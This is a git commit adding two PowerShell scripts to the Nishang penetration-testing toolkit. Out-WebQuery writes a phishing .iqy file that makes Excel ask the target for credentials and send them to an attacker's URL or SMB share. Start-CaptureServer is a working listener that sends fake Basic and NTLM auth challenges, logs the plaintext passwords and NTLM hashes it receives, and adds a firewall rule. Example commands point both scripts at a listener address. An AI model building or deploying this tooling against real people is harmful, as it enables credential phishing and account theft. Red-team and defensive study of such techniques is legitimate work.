88e76de5e90cc643590ff5b5771f1bbf1051721c
Nikhil "SamratAshok" Mittal <nikhil.uitrgpv@gmail.com>
2015-08-26 14:18:38 +0530

    Added scripts for abusing IQY files

---
+++ Client/Out-WebQuery.ps1
@@ -0,0 +1,70 @@
+﻿function Out-WebQuery
+{
+<#
+.SYNOPSIS
+Nishang script which creates a Web Query (.iqy) file which can be used for phishing attacks.
+
+.DESCRIPTION
+The script generates a Web Query (.iqy). When a target opens the file, it is opened inside an Excel Sheet and the
+user is presented with a warning for enabling data connection. If the user allows it, he is presented with a prompt 
+which asks for credentials. As soon as the user enters the credentials, it is sent to the remote server specified 
+while generating the file.
+
+The attacker must run a web server which is able to log the requests made to it by the targets. While any regular web
+server can be used, Start-CaptureServer.ps1 in the Utility directory of Nishang could be used as well. Start-CaptureServer
+supports Basic auth for capturing credentials in plain and NTLM authentication for capturing hashes.
+
+.PARAMETER URL
+URL to which the connection from the target is made. A web server which logs requests must run at this URL.
+
+.PARAMETER Message
+Message which will be shown to the user after he enables the Data Connection.
+
+.PARAMETER OutputPath
+Path to the .iqy file to be generated. Default is with the name QueryData.iqy in the current directory.
+
+.EXAMPLE
+PS > Out-WebQuery -URL http://192.168.1.2/
+
+Use above command to generate a Web Query file. When a user opens it and enables data connection, 
+a credentials prompt will be shown to him. The credentials entered could be captured on the listener machine
+using Start-CaptureServer script from Nishang.
+
+To capture credentials in plain, run below command on the attacker's machine:
+Start-CaptureServer -AuthType Basic -IPAddress 192.168.230.1 -LogFilePath C:\test\log.txt
+
+To capture hashes
+Start-CaptureServer -AuthType NTLM2 -IPAddress 192.168.230.1 -LogFilePath C:\test\log.txt
+
+PS > Out-WebQuery -URL \\192.168.1.2\C$
+
+Use above command to generate a Web Query file. When a user opens it, his SMB hash would be captured
+on the attacker's machine where Start-CaptureServer is running.
+
+
+.LINK
+http://www.labofapenetrationtester.com/2015/08/abusing-web-query-iqy-files.html
+https://github.com/samratashok/nishang
+https://twitter.com/subTee/status/631509345918783489
+https://support.microsoft.com/en-us/kb/157482
+#>
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $URL,
+
+        [Parameter(Position = 1, Mandatory = $False)]
+        [String]
+        $OutputPath = "$pwd\QueryData.iqy"
+
+    )
+    $iqycontent = @"
+WEB 
+1 
+$URL
+"@
+
+    Out-File -FilePath $OutputPath -InputObject $iqycontent -Encoding ascii
+    Write-Output "The Web Query file has been written as $OutputPath"
+
+}
---
+++ Utility/Start-CaptureServer.ps1
@@ -0,0 +1,192 @@
+﻿function Start-CaptureServer
+{
+<#
+.SYNOPSIS
+Nishang script which could be used to capture user crednetials in plain or SMB hashes.
+
+.DESCRIPTION
+The script heystarts a listener on specified IP and port. When using Basic Authtype, any user connecting to the server
+will be presented with a credentials prompt, if a user enters the username and password, they will be captured in plain
+on the server. When using NTLM2 type, SMB hashes will be captured. 
+
+.PARAMETER AuthType
+Choose AuthType Basic for capturing credentials in plain or NTLM2 for hashes. Default is Basic.
+
+.PARAMETER IPAdress
+IPaddress on which the listener starts.
+
+.PARAMETER Port
+Port on which the listener listens. Default is 80.
+
+.PARAMETER $LogFilePath
+Path to log file where hashes/creds will be logged. Default is with the name requeslog.txt in the current directory.
+
+.EXAMPLE
+PS > Start-CaptureServer -AuthType Basic -IPAddress 192.168.230.1 -LogFilePath C:\test\log.txt
+
+Use above command to start a listener which will be able to log credentials in plain whenever a user connects to 
+it and use credentials.
+
+PS > Start-CaptureServer -AuthType NTLM2 -IPAddress 192.168.230.1 -LogFilePath C:\test\log.txt
+
+Use above command to start a listener which will be able to log SMB Hashes in plain whenever a user connects to 
+it and use credentials or connects using a UNC path.
+
+
+.LINK
+http://www.labofapenetrationtester.com/2015/08/abusing-web-query-iqy-files.html
+https://github.com/samratashok/nishang
+https://twitter.com/subTee/status/631509345918783489
+https://gist.github.com/subTee/5eb3ceccf0cd843c8010
+#>
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $False)]
+        [String]
+        [ValidateSet("NTLM2","Basic")]
+        $AuthType = "Basic",
+        
+        [Parameter(Position = 1, Mandatory = $False)]
+        [String]
+        $IPAddress,
+
+        [Parameter(Position = 2, Mandatory = $False)]
+        [String]
+        $Port = 80,
+
+        [Parameter(Position = 3, Mandatory = $False)]
+        [String]
+        $LogFilePath = "$pwd\requestlog.txt"
+
+    )
+
+function ExtractHash([string] $NTLMType3)
+{
+
+	$bytes = [System.Convert]::FromBase64String($NTLMType3)
+	$bytes | foreach { $string = $string + $_.ToString("X2") }
+	
+	Write-Output $string.substring($string.length - 48, 48)
+	
+}
+
+
+[byte[]]$NTLMType2 = 
+	@(0x4e,0x54,0x4c,0x4d, 
+	0x53,0x53,0x50,0x00,
+	0x02,0x00,0x00,0x00,
+	0x00,0x00,0x00,0x00,
+	0x00,0x28,0x00,0x00,
+	0x01,0x82,0x00,0x00,
+	0x11,0x22,0x33,0x44,
+	0x55,0x66,0x77,0x88,
+	0x00,0x00,0x00,0x00,
+	0x00,0x00,0x00,0x00)
+
+
+    $listener = New-Object System.Net.HttpListener
+    $URL = "http://"+$IPAddress+":"+$Port+"/"
+    $listener.Prefixes.Add($URL) 
+
+    netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
+    netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null
+
+    $listener.Start()
+    Write-Output "Listening on $URL..."
+    while ($true) {
+        $context = $listener.GetContext() # blocks until request is received
+        $request = $context.Request
+        $response = $context.Response
+	    $hostip = $request.RemoteEndPoint
+	
+	    $headers = $request.Headers
+	    $message = ''
+
+        if ($AuthType -eq "Basic")
+        {
+        $basic = $true
+        }
+
+	    foreach ($key in $headers.AllKeys)
+	    {
+		    if($key -match 'Authorization')
+		    {
+			    [string[]]$values = $headers.GetValues('Authorization')
+			    #Write-Host $values[0] -fore Cyan
+
+			    if ($basic)
+                {
+                    $NTLMAuthentication = $values[0] -split "\s+"
+                    $creds = ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String( $NTLMAuthentication[1])))
+                    Write-Output $context.Request.RemoteEndPoint.Address.IPAddressToString
+                    Write-Output $creds
+                    Out-File -FilePath $LogFilePath -InputObject $context.Request.RemoteEndPoint.Address.IPAddressToString -Append
+                    Out-File -FilePath $LogFilePath -InputObject $creds -Append
+                }
+                else
+                {
+                    $NTLMAuthentication = $values[0] -split "\s+"
+			        Write-Output $context.Request.RemoteEndPoint.Address.IPAddressToString
+                    #Write-Output $NTLMAuthentication[1]
+			        $NTLMType = $NTLMAuthentication[1]
+			        $hash = ExtractHash($NTLMType)
+                    Write-Output $hash
+                    Out-File -FilePath $LogFilePath -InputObject $context.Request.RemoteEndPoint.Address.IPAddressToString -Append
+                    Out-File -FilePath $LogFilePath -InputObject $hash -Append
+                    Out-File -FilePath $LogFilePath -InputObject ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($NTLMType))) -Append
+                    $ntlmt2 = $true
+                }
+		    }
+		
+		
+        }		
+	
+	    if($ntlmt2)
+	    {
+		    $NTLMType2Response = 'NTLM ' + [Convert]::ToBase64String($NTLMType2)
+		    $response.AddHeader('WWW-Authenticate', $NTLMType2Response)
+		    $response.AddHeader("Content-Type","text/html")
+		    $response.StatusCode = 401
+		    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
+		    $response.ContentLength64 = $buffer.length
+		    $output = $response.OutputStream
+		    $output.Write($buffer, 0, $buffer.length)
+		    $output.Close()
+		    continue
+        }
+
+        elseif($basic)
+        {
+            $response.AddHeader('WWW-Authenticate', 'Basic')
+		    $response.AddHeader("Content-Type","text/html")
+            $response.AddHeader("Host","InternetGateway")
+		    $response.StatusCode = 401
+        
+
+		    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes("Win Proxy")
+		    $response.ContentLength64 = $buffer.length
+		    $output = $response.OutputStream
+		    $output.Write($buffer, 0, $buffer.length)
+		    $output.Close()
+		    continue
+        }
+
+	    else
+	    {
+		    $response.AddHeader('WWW-Authenticate', 'NTLM')
+		    $response.AddHeader('Content-Type','text/html')
+		    $response.StatusCode = 401
+		
+
+		    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
+		    $response.ContentLength64 = $buffer.length
+		    $output = $response.OutputStream
+		    $output.Write($buffer, 0, $buffer.length)
+		    $output.Close()
+		    continue
+	    }
+		
+    }
+
+    $listener.Stop()
+}
+
